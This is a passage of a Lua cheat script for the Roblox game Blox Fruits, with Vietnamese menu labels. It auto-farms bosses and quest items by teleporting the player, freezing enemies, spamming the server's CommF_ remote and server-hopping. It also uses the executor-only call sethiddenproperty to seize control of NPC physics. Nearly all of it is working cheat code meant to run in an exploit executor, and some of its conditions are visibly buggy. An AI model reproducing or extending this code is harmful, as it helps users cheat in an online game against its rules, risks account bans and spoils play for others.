           for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                        if v.Name == "Vampire" then
                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                repeat wait()
                                    AutoHaki()
                                    if not game.Players.LocalPlayer.Character:FindFirstChild(_G.SelectWeapon) then
                                    wait()
                                    EquipWeapon(_G.SelectWeapon)
                                    end
                                    v.HumanoidRootPart.CanCollide = false
                                    v.Humanoid.WalkSpeed = 0
                                    Ditme = true
                                    topos(v.HumanoidRootPart.CFrame * Pos)   
                                until not StartFarm or not v.Parent or v.Humanoid.Health <= 0
                                Ditme = false
                            end
                        end
                    end
                else
                    Ditme = false
                    topos(CFrame.new(-6004.3291, 137.230042, -1308.05957))
                    for i, v in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do 
                        if v.Name == "Vampire" then
                            topos(v.HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        end
                    end
                end
            end
            )
        end
    end
end
)
                                    
local Toggle = Tabs.item:AddToggle("Start Farm", { Title = "Bắt Đầu Farm", Description = "Farm nhanh", Default = false })
Toggle:OnChanged(function(Value)
    StartFarm = Value
    StopTween(StartFarm)
end)
local Cuti = Tabs.item:AddSection("Farm Boss Server")
local Toggle = Tabs.item:AddToggle("auto Change", { Title = "Auto Soul Reaper | Sea 3", Description = "Farm nhanh", Default = false })
Toggle:OnChanged(function(Value)
_G.Buoi = Value
StopTween(_G.Buoi)
end)         
    
spawn(function()
        while wait() do
            if _G.Buoi then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Soul Reaper") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Soul Reaper" then
                                repeat task.wait()
                                    EquipWeapon(_G.SelectWeapon)
                                    AutoHaki()
                                    topos(v.HumanoidRootPart.CFrame*Pos)
                                    v.HumanoidRootPart.Transparency = 1
                                    sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)
                                until v.Humanoid.Health <= 0 or _G.Buoi == false
                            end
                        end
                    elseif game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hallow Essence") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Hallow Essence") then
                        repeat topos(CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125)) wait() until (CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 8                        
                        EquipWeapon("Hallow Essence")
                    else
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Soul Reaper") then
                            topos(game:GetService("ReplicatedStorage"):FindFirstChild("Soul Reaper").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        else
                            if _G.AutoFarmBossHallowHop then
                                Hop()
                            end
                        end
                    end
                end)
            end
        end
    end)       
local Toggle = Tabs.item:AddToggle("Auto Saber", { Title = "Auto Kiếm Saber | Sea 1", Default = false })
Toggle:OnChanged(function(Value)
    _G.Cuttay = Value
    StopTween(_G.Cuttay)
end)

spawn(function()
     while task.wait() do
            if _G.Cuttay and game.Players.LocalPlayer.Data.Level.Value >= 200 then
                pcall(function()
                    if game:GetService("Workspace").Map.Jungle.Final.Part.Transparency == 0 then
                        if game:GetService("Workspace").Map.Jungle.QuestPlates.Door.Transparency == 0 then
                            if (CFrame.new(-1612.55884, 36.9774132, 148.719543).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
                                topos(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame)
                                wait(0.2)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Map.Jungle.QuestPlates.Plate1.Button.CFrame
                                wait(0.2)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Map.Jungle.QuestPlates.Plate2.Button.CFrame
                                wait(0.2)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Map.Jungle.QuestPlates.Plate3.Button.CFrame
                                wait(0.2)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Map.Jungle.QuestPlates.Plate4.Button.CFrame
                                wait(0.2)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Map.Jungle.QuestPlates.Plate5.Button.CFrame
                                wait(0.2)
                            else
                        topos(CFrame.new(-1612.55884, 36.9774132, 148.719543))
                            end
                        else
                            if game:GetService("Workspace").Map.Desert.Burn.Part.Transparency == 0 then
                                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Torch") or game.Players.LocalPlayer.Character:FindFirstChild("Torch") then
                                    EquipWeapon("Torch")
                          topos(CFrame.new(1114.61475, 5.04679728, 4350.22803))
                                  else
                          topos(CFrame.new(-1610.00757, 11.5049858, 164.001587))
                                end
                            else
                                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan") ~= 0 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","GetCup")
                                    wait(0.5)
                                    EquipWeapon("Cup")
                                    wait(0.5)
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","FillCup",game:GetService("Players").LocalPlayer.Character.Cup)
                                    wait(0)
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","SickMan")
                                else
                                    if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == nil then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon")
                                    elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 0 then
                                    if game:GetService("Workspace").Enemies:FindFirstChild("Mob Leader") or game:GetService("ReplicatedStorage"):FindFirstChild("Mob Leader") then
										topos(CFrame.new(-2967.59521, -4.91089821, 5328.70703)) 
                       for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                      if game:GetService("Workspace").Enemies:FindFirstChild("Mob Leader [Lv. 120] [Boss]") then
                                      if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                if v.Name == "Mob Leader" then    
                                                        repeat wait()
                                                        AutoHaki()
                                              EquipWeapon(_G.SelectWeapon)
                                          v.HumanoidRootPart.CanCollide = false
                                                        v.Humanoid.WalkSpeed = 0
                                                        topos(v.HumanoidRootPart.CFrame * Pos)                                                        
                                              until v.Humanoid.Health <= 0 or not _G.Cuttay
                                                     end
                                                end
                                                if game:GetService("ReplicatedStorage"):FindFirstChild("Mob Leader") then
                                                    topos(game:GetService("ReplicatedStorage"):FindFirstChild("Mob Leader").HumanoidRootPart.CFrame * Pos)
                                                end
                                            end
                                        end
                                     end
                                    elseif game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon") == 1 then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","RichSon")
                                        wait(0.5)
                                        EquipWeapon("Relic")
                                        wait(0.5)
                          topos(CFrame.new(-1404.91504, 29.9773273, 3.80598116))
                                    end
                                end
                            end
                        end
                    else
                        if game:GetService("Workspace").Enemies:FindFirstChild("Saber Expert") or game:GetService("ReplicatedStorage"):FindFirstChild("Saber Expert") then
                            for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    if v.Name == "Saber Expert" then
                                           repeat wait()
                                            EquipWeapon(_G.SelectWeapon)
                                            topos(v.HumanoidRootPart.CFrame * Pos)
                                            v.HumanoidRootPart.Transparency = 1
                                            v.Humanoid.JumpPower = 0
                                            v.Humanoid.WalkSpeed = 0
                                            v.HumanoidRootPart.CanCollide = false
                                            StartBring = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            MonFarm = v.Name                                            
                                        until v.Humanoid.Health <= 0 or not _G.Cuttay
                                        StartBring = true
                                        if v.Humanoid.Health <= 0 then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("ProQuestProgress","PlaceRelic")
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end
    end)


local Toggle = Tabs.item:AddToggle("Auto Pole", { Title = "Auto Kiếm Pole | Sea 1", Default = false })
Toggle:OnChanged(function(LuoiQuaAeOi)
    _G.Khi_Dot_Len_Dien = LuoiQuaAeOi
    StopTween(_G.Khi_Dot_Len_Dien)
end)    
    
     spawn(function()
        while wait() do
            if  _G.Khi_Dot_Len_Dien and World1 then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Thunder God") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Thunder God" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        topos(v.HumanoidRootPart.CFrame * Pos)                                        
                                    until not _G.Khi_Dot_Len_Dien or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    else
                    if BypassTP then
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - PolePos.Position).Magnitude > 1500 then
			        BTP(JackBoCon)
				    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - PolePos.Position).Magnitude < 1500 then
				    topos(JackBoCon)
					end
				else
				    topos(JackBoCon)
				end
				    UnEquipWeapon(_G.SelectWeapon)
                    topos(CFrame.new(-7748.0185546875, 5606.80615234375, -2305.898681640625))
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Thunder God") then
                            topos(game:GetService("ReplicatedStorage"):FindFirstChild("Thunder God").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        end
                    end
                end)
            end
        end
    end)   
    
local Toggle = Tabs.item:AddToggle("Auto Rengoku", { Title = "Auto Kiếm Rengoku | Sea 2", Default = false })
Toggle:OnChanged(function(Value)
    _G.Kiem_Lua = Value
    StopTween(_G.Kiem_Lua)
end)            

spawn(function()
        pcall(function()
            while wait() do
                if _G.Kiem_Lua and World2 then
                    if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Hidden Key") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Hidden Key") then
                        EquipWeapon("Hidden Key")
                        topos(CFrame.new(6571.1201171875, 299.23028564453, -6967.841796875))
                    elseif game:GetService("Workspace").Enemies:FindFirstChild("Snow Lurker") or game:GetService("Workspace").Enemies:FindFirstChild("Arctic Warrior") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if (v.Name == "Snow Lurker" or v.Name == "Arctic Warrior") and v.Humanoid.Health > 0 then
                                repeat task.wait()
                                    EquipWeapon(_G.SelectWeapon)
                                    AutoHaki()                                    
                                    v.HumanoidRootPart.CanCollide = false
                                    RengokuMon = v.HumanoidRootPart.CFrame
                                    topos(v.HumanoidRootPart.CFrame * Pos)      
                                    RenGuKu = true
                                until _G.Kiem_Lua == false or not v.Parent or v.Humanoid.Health <= 0
                                StartRengokuMagnet = false
                            end
                        end
                    else
                        RenGuKu = false
                        topos(CFrame.new(5439.716796875, 84.420944213867, -6715.1635742188))
                    end
                end
            end
        end)
    end)

local Toggle = Tabs.item:AddToggle("Auto Ectoplasm", { Title = "Auto item Ectoplasm | Sea 2", Default = false })
Toggle:OnChanged(function(Value)
    Auto_Ki_Di = Value
    StopTween(Auto_Ki_Di)
end)            

    spawn(function()
        while wait() do
            if Auto_Ki_Di and World2 then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Ship Deckhand") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Engineer") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Steward") or game:GetService("Workspace").Enemies:FindFirstChild("Ship Officer") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Ship Officer" or v.Name == "Ship Steward" or "Ship Engineer" or "Ship Deckhand" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        topos(v.HumanoidRootPart.CFrame * Pos)
                                        StartEctoplasmMagnet = true
                                        EctoplasmMon = v.HumanoidRootPart.CFrame
                                        topos(v.HumanoidRootPart.CFrame * CFrame.new(PosX,PosY,PosZ))
                                    until not Auto_Ki_Di or not v.Parent or v.Humanoid.Health <= 0
                                    StartEctoplasmMagnet = false
                                end
                            end
                        end
                    else
                        StartEctoplasmMagnet = false
                        topos(CFrame.new(911.35827636719, 125.95812988281, 33159.5390625))
                    end
                end)
            end
        end
    end)

local Toggle = Tabs.item:AddToggle("Auto Ectoplasm", { Title = "Auto Mua 3 Kiếm Zero | Sea 2", Default = false })
Toggle:OnChanged(function(KiemNhuLon)
    Uwusword = KiemNhuLon
end)      

spawn(function()
    while wait() do
        if Uwusword then
            pcall(function()
                local args = {
                    [1] = "LegendarySwordDealer",
                    [2] = "1"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                local args = {
                    [1] = "LegendarySwordDealer",
                    [2] = "2"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                local args = {
                    [1] = "LegendarySwordDealer",
                    [2] = "3"
                }
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            end)
        end 
    end
end)
--//Farm Sea 3 
local Toggle = Tabs.item:AddToggle("auto Kill", { Title = "Auto Làm Holy Torch | Sea 3",  Default = false })
Toggle:OnChanged(function(Value)
_G.Gan_Duoc_Cho_Khi = Value
StopTween(_G.Gan_Duoc_Cho_Khi)
end)            

spawn(function()
    while wait(.5) do
        pcall(function()
            if _G.Gan_Duoc_Cho_Khi and World3 then
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Holy Torch") or game.Players.LocalPlayer.Character:FindFirstChild("Holy Torch") then
                    repeat wait(.2)
                        EquipWeapon("Holy Torch")
                        topos(CFrame.new(-10752.4434, 415.261749, -9367.43848, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                    until (Vector3.new(-10752.4434, 415.261749, -9367.43848)-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5
                    wait(2)
                    repeat wait(.2)
                        EquipWeapon("Holy Torch")
                        topos(CFrame.new(-11671.6289, 333.78125, -9474.31934, 0.300932229, 0, -0.953645527, 0, 1, 0, 0.953645527, 0, 0.300932229))
                    until (Vector3.new(-11671.6289, 333.78125, -9474.31934)-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5
                    wait(2)
                    repeat wait(.2)
                        EquipWeapon("Holy Torch")
                        topos(CFrame.new(-12133.1406, 521.507446, -10654.292, 0.80428642, 0, -0.594241858, 0, 1, 0, 0.594241858, 0, 0.80428642))
                    until (Vector3.new(-12133.1406, 521.507446, -10654.292)-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5
                    wait(2)
                    repeat wait(.2)
                        EquipWeapon("Holy Torch")
                        topos(CFrame.new(-13336.127, 484.521179, -6985.31689, 0.853732228, 0, -0.520712316, 0, 1, 0, 0.520712316, 0, 0.853732228))
                    until (Vector3.new(-13336.127, 484.521179, -6985.31689)-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5
                    wait(2)
                    EquipWeapon("Holy Torch")
                    repeat wait(.2)
                        topos(CFrame.new(-13487.623, 336.436188, -7924.53857, -0.982848108, 0, 0.184417039, 0, 1, 0, -0.184417039, 0, -0.982848108))
                    until (Vector3.new(-13487.623, 336.436188, -7924.53857)-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 5
                    wait(2)
                    Com()
                    wait(20)
                elseif not game.Players.LocalPlayer.Backpack:FindFirstChild("Holy Torch") and not game.Players.LocalPlayer.Character:FindFirstChild("Holy Torch") then
                   local Distance = (Vector3.new(5153.18799, 172.82933, 909.815918) - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
					    if Distance > 5000 then
					    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656))
					    end                 
                   topos(CFrame.new(5153.18799, 172.82933, 909.815918))
                    wait(3)
                end
            end
        end)
    end
end)

local Toggle = Tabs.item:AddToggle("auto Change", { Title = "Đổi Haki Aura | All Sea", Default = false })
Toggle:OnChanged(function(Value)
Gan_Haki_Lon = Value
StopTween(Gan_Haki_Lon)
end)            

spawn(function()
    while wait(.2) do
        pcall(function()
            if Gan_Haki_Lon and World3 then              
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-5072.08984375, 314.5412902832, -3151.1098632812))
                wait(0.4)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("activateColor","Winter Sky")
            	wait(0.4)
            	repeat topos(CFrame.new(-5420.16602, 1084.9657, -2666.8208)) wait() 
                until _G.StopTween == true or Gan_Haki_Lon == false or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-5420.16602, 1084.9657, -2666.8208)).Magnitude <= 10
                wait(0.4)
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("activateColor","Pure Red")
                wait(0.4)
                repeat topos(CFrame.new(-5414.41357, 309.865753, -2212.45776)) wait() 
                until _G.StopTween == true or Gan_Haki_Lon == false or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-5414.41357, 309.865753, -2212.45776)).Magnitude <= 10               
                wait(0.4)
              game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-5072.08984375, 314.5412902832, -3151.1098632812))                   
                wait(0.4)
             game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("activateColor","Snow White")                             
                wait(0.4)
                repeat topos(CFrame.new(-4971.47559, 331.565765, -3720.02954)) wait() 
                until _G.StopTween == true or Gan_Haki_Lon == false or (game.Players.LocalPlayer.Character.HumanoidRootPart.Position-Vector3.new(-4971.47559, 331.565765, -3720.02954)).Magnitude <= 10
                wait(0.5)
                game:GetService'VirtualUser':Button1Down(Vector2.new(1280,600))
                wait(3)
                game:GetService'VirtualUser':Button1Down(Vector2.new(1280,600))
            end
        end) 
    end
end)

local Toggle = Tabs.item:AddToggle("auto Kill", { Title = "Auto Đánh Rip_Indra | Sea 3", Description = "", Default = false })
Toggle:OnChanged(function(Value)
_G.ThangDauMatLon = Value
StopTween(_G.ThangDauMatLon)
end)            
    spawn(function()
        pcall(function()
            while wait() do
                if _G.ThangDauMatLon and World3 then
                    if game:GetService("Workspace").Enemies:FindFirstChild("rip_indra True Form") or game:GetService("Workspace").Enemies:FindFirstChild("rip_indra") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == ("rip_indra True Form" or v.Name == "rip_indra") and v.Humanoid.Health > 0 and v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
                                repeat task.wait()
                                    pcall(function()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)       
                                        v.HumanoidRootPart.CanCollide = false
                                        topos(v.HumanoidRootPart.CFrame * Pos)
                                    end)
                                until _G.ThangDauMatLon == false or v.Humanoid.Health <= 0
                            end
                        end
                    else
                    if BypassTP then
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BuCacCho.Position).Magnitude > 1500 then
                    BTP(BuCacCho)
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BuCacCho.Position).Magnitude < 1500 then
                    topos(BuCacCho)
                    end
                else
                    topos(BuCacCho)
                end
                        topos(CFrame.new(-5344.822265625, 423.98541259766, -2725.0930175781))
                    end
                end
            end
        end)
    end)

local Toggle = Tabs.item:AddToggle("auto Kill", { Title = "Auto Kiếm Tushita | Sea 3", Default = false })
Toggle:OnChanged(function(Value)
_G.Long_Ma_Bac_Giang = Value
StopTween(_G.Long_Ma_Bac_Giang)
end)            

    spawn(function()
        while wait() do
            if  _G.Long_Ma_Bac_Giang and World3 then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Longma") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Longma" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        topos(v.HumanoidRootPart.CFrame * Pos)
                               
                                        sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)
                                    until not  _G.Long_Ma_Bac_Giang or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    else
                    if BypassTP then
                    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - LongMa.Position).Magnitude > 1500 then
                    BTP(LongMa)
                    elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - LongMa.Position).Magnitude < 1500 then
                    topos(LongMa)
                    end
                else
                    topos(LongMa)
                end
                    topos(CFrame.new(-10238.875976563, 389.7912902832, -9549.7939453125))
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Longma") then
                            topos(game:GetService("ReplicatedStorage"):FindFirstChild("Longma").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        else
                            if  _G.Autotushitahop then
                                Hop()
                            end
                        end
                    end
                end)
            end
        end
    end)

local Toggle = Tabs.item:AddToggle("Auto Eliter Hunter", { Title = "Auto Đánh Eliter Hunter | Sea 3", Default = false })
Toggle:OnChanged(function(Value)
    _G.Eli_Ngu = Value
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("AbandonQuest")
 StopTween(_G.Eli_Ngu)
end)    

spawn(function()
        while wait() do
            if _G.Eli_Ngu then
                pcall(function()
                    if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
						if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Diablo") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Deandre") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Urban") then
							if game:GetService("Workspace").Enemies:FindFirstChild("Diablo") or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") or game:GetService("Workspace").Enemies:FindFirstChild("Urban") then
								for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
									if v.Name == "Diablo" or v.Name == "Deandre" or v.Name == "Urban" then
										if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
											repeat wait()
												AutoHaki()
                                                EquipWeapon(_G.SelectWeapon)
                                                v.HumanoidRootPart.CanCollide = false
                                                v.Humanoid.WalkSpeed = 0
                                                topos(v.HumanoidRootPart.CFrame * CFrame.new(PosX,PosY,PosZ))
                                                
                                                sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
                                            until _G.AutoElitehunter == false or v.Humanoid.Health <= 0 or not v.Parent
										end
									end
								end
							else
								if game:GetService("ReplicatedStorage"):FindFirstChild("Diablo") then
                                    topos(game:GetService("ReplicatedStorage"):FindFirstChild("Diablo").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                                elseif game:GetService("ReplicatedStorage"):FindFirstChild("Deandre") then
                                    topos(game:GetService("ReplicatedStorage"):FindFirstChild("Deandre").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                                elseif game:GetService("ReplicatedStorage"):FindFirstChild("Urban") then
                                    topos(game:GetService("ReplicatedStorage"):FindFirstChild("Urban").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
								end
							end                    
						end
					else

						if _G.AutoEliteHunterHop and game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("EliteHunter") == "I don't have anything for you right now. Come back later." then
							hop()
						else
							game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("EliteHunter")
						end
					end
				end)
			end
		end
	end)
	
local Toggle = Tabs.item:AddToggle("auto Change", { Title = "Auto Đánh Dough King | Sea 3", Default = false })
Toggle:OnChanged(function(Value)
_G.Katakuri_V2_Nhu_lon = Value
StopTween(_G.Katakuri_V2_Nhu_lon)
end)         

spawn(function()
	game:GetService("RunService").Heartbeat:Connect(function()
			pcall(function()
				for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
					if _G.Katakuri_V2_Nhu_lon and StartCakeStartMagnet and (v.Name == "Cookie Crafter" or v.Name == "Cake Guard" or v.Name == "Baking Staff" or v.Name == "Head Baker") and (v.HumanoidRootPart.Position - POSCAKE.Position).magnitude <= 300 then
						v.HumanoidRootPart.CFrame = POSCAKE
						v.HumanoidRootPart.CanCollide = false
						if v.Humanoid:FindFirstChild("Animator") then
							v.Humanoid.Animator:Destroy()
						end
	sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius",  math.huge)
					end
				end
			end)
		end)
	end) 

spawn(function()
		while wait() do
			if _G.Katakuri_V2_Nhu_lon then
				pcall(function()
					if game.Players.LocalPlayer.Backpack:FindFirstChild("God's Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("God's Chalice") then
						if string.find(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SweetChaliceNpc"),"Where") then
							game.StarterGui:SetCore("SendNotification", {
								Title = "Notification", 
								Text = "Not Have Enough Material" ,
								Duration = 2.5
							})
						else
							game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SweetChaliceNpc")
						end
					elseif game.Players.LocalPlayer.Backpack:FindFirstChild("Sweet Chalice") or game.Players.LocalPlayer.Character:FindFirstChild("Sweet Chalice") then
						if string.find(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),"Do you want to open the portal now?") then
							game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")
						else
							if game.Workspace.Enemies:FindFirstChild("Baking Staff") or game.Workspace.Enemies:FindFirstChild("Head Baker") or game.Workspace.Enemies:FindFirstChild("Cake Guard") or game.Workspace.Enemies:FindFirstChild("Cookie Crafter")  then
								for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do  
									if (v.Name == "Baking Staff" or v.Name == "Head Baker" or v.Name == "Cake Guard" or v.Name == "Cookie Crafter") and v.Humanoid.Health > 0 then
										repeat wait()
											AutoHaki()
											EquipWeapon(_G.SelectWeapon)
											StartCakeStartMagnet = true
											POSCAKE = v.HumanoidRootPart.CFrame
											topos(v.HumanoidRootPart.CFrame * Pos)
											
										until _G.Katakuri_V2_Nhu_lon == false or game:GetService("ReplicatedStorage"):FindFirstChild("Cake Prince") or not v.Parent or v.Humanoid.Health <= 0
									end
								end
							else
								StartCakeStartMagnet = false
								topos(CFrame.new(-1820.0634765625, 210.74781799316406, -12297.49609375))
							end
						end						
					elseif game.ReplicatedStorage:FindFirstChild("Dough King") or game:GetService("Workspace").Enemies:FindFirstChild("Dough King") then
						if game:GetService("Workspace").Enemies:FindFirstChild("Dough King") then
							for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do 
								if v.Name == "Dough King" then
									repeat wait()
										AutoHaki()
										EquipWeapon(_G.SelectWeapon)
										v.HumanoidRootPart.CanCollide = false
										topos(v.HumanoidRootPart.CFrame * Pos)
									until _G.Katakuri_V2_Nhu_lon == false or not v.Parent or v.Humanoid.Health <= 0
								end    
							end    
						else
							topos(CFrame.new(-2009.2802734375, 4532.97216796875, -14937.3076171875)) 
						end
					elseif game.Players.LocalPlayer.Backpack:FindFirstChild("Red Key") or game.Players.LocalPlayer.Character:FindFirstChild("Red Key") then
						local args = {
							[1] = "CakeScientist",
							[2] = "Check"
						}

						game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
					else
						if game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Visible == true then
							if string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Diablo") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Deandre") or string.find(game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text,"Urban") then
								if game:GetService("Workspace").Enemies:FindFirstChild("Diablo") or game:GetService("Workspace").Enemies:FindFirstChild("Deandre") or game:GetService("Workspace").Enemies:FindFirstChild("Urban") then
									for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
										if v.Name == "Diablo" or v.Name == "Deandre" or v.Name == "Urban" then
											if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
												repeat wait()
													AutoHaki()
													EquipWeapon(_G.SelectWeapon)
													
													v.HumanoidRootPart.CanCollide = false
													v.Humanoid.WalkSpeed = 0
													topos(v.HumanoidRootPart.CFrame * CFrame.new(PosX,PosY,PosZ))
													
													sethiddenproperty(game:GetService("Players").LocalPlayer,"SimulationRadius",math.huge)
